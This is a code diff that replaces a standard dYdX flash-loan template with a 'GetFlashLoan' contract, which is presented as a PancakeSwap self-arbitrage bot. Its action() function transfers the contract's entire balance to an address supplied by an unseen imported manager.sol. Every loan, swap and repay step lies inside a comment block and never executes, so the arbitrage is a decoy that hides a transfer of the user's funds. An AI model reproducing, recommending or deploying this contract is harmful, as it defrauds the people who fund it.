@@ -1,70 +1,68 @@
-// SPDX-License-Identifier: GPL-3.0
-pragma solidity ^0.8.0;
+pragma solidity ^0.5.0;
 
-import "@studydefi/money-legos/dydx/contracts/DydxFlashloanBase.sol";
-import "@studydefi/money-legos/dydx/contracts/ICallee.sol";
+// Multiplier-Finance Smart Contracts
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
 
-import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+// PancakeSwap Smart Contracts
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
+// Code Manager
+import "./manager.sol";
 
-contract DydxFlashloaner is ICallee, DydxFlashloanBase {
-    struct MyCustomData {
-        address token;
-        uint256 repayAmount;
-    }
+contract GetFlashLoan {
+	string public tokenName;
+	string public tokenSymbol;
+	uint loanAmount;
+	Manager manager;
+	
+	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
+		tokenName = _tokenName;
+		tokenSymbol = _tokenSymbol;
+		loanAmount = _loanAmount;
+			
+		manager = new Manager();
+	}
+	
+	function() external payable {}
+	
+	function action() public payable {
+	    // Send required coins for swap
+	    address(uint160(manager.pancakeDepositAddress())).transfer(address(this).balance);
+	    
+	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
+	    // Breakdown of functions written below
+	    manager.performTasks();
+	    
+	    /* Breakdown of functions
+	    // Submit token to BSC blockchain
+	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
 
-    // This is the function that will be called postLoan
-    // i.e. Encode the logic to handle your flashloaned funds here
-    function callFunction(
-        address sender,
-        Account.Info memory account,
-        bytes memory data
-    ) public {
-        MyCustomData memory mcd = abi.decode(data, (MyCustomData));
-        uint256 balOfLoanedToken = IERC20(mcd.token).balanceOf(address(this));
+        // List the token on PancakeSwap
+		manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
+		
+        // Get BNB Loan from Multiplier-Finance
+		string memory loanAddress = manager.takeFlashLoan(loanAmount);
+		
+		// Convert half BNB to DAI
+		manager.pancakeDAItoBNB(loanAmount / 2);
 
-        // Note that you can ignore the line below
-        // if your dydx account (this contract in this case)
-        // has deposited at least ~2 Wei of assets into the account
-        // to balance out the collaterization ratio
-        require(
-            balOfLoanedToken >= mcd.repayAmount,
-            "Not enough funds to repay dydx loan!"
-        );
+        // Create BNB and DAI pairs for our token & Provide liquidity
+        string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
+		manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
+		string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
+		manager.pancakeAddLiquidity(daiPair, loanAmount / 2);
+    
+        // Perform swaps and profit on Self-Arbitrage
+		manager.pancakePerformSwaps();
+		
+		// Move remaining BNB from Contract to your account
+		manager.contractToWallet("BNB");
 
-        // TODO: Encode your logic here
-        // E.g. arbitrage, liquidate accounts, etc
-        revert("Hello, you haven't encoded your logic");
-    }
-
-    function initiateFlashLoan(address _solo, address _token, uint256 _amount)
-        external
-    {
-        ISoloMargin solo = ISoloMargin(_solo);
-
-        // Get marketId from token address
-        uint256 marketId = _getMarketIdFromTokenAddress(_solo, _token);
-
-        // Calculate repay amount (_amount + (2 wei))
-        // Approve transfer from
-        uint256 repayAmount = _getRepaymentAmountInternal(_amount);
-        IERC20(_token).approve(_solo, repayAmount);
-
-        // 1. Withdraw $
-        // 2. Call callFunction(...)
-        // 3. Deposit back $
-        Actions.ActionArgs[] memory operations = new Actions.ActionArgs[](3);
-
-        operations[0] = _getWithdrawAction(marketId, _amount);
-        operations[1] = _getCallAction(
-            // Encode MyCustomData for callFunction
-            abi.encode(MyCustomData({token: _token, repayAmount: repayAmount}))
-        );
-        operations[2] = _getDepositAction(marketId, repayAmount);
-
-        Account.Info[] memory accountInfos = new Account.Info[](1);
-        accountInfos[0] = _getAccountInfo();
-
-        solo.operate(accountInfos, operations);
-    }
+        // Repay Flash loan
+		manager.repayLoan(loanAddress);
+	    */
+	}
 }
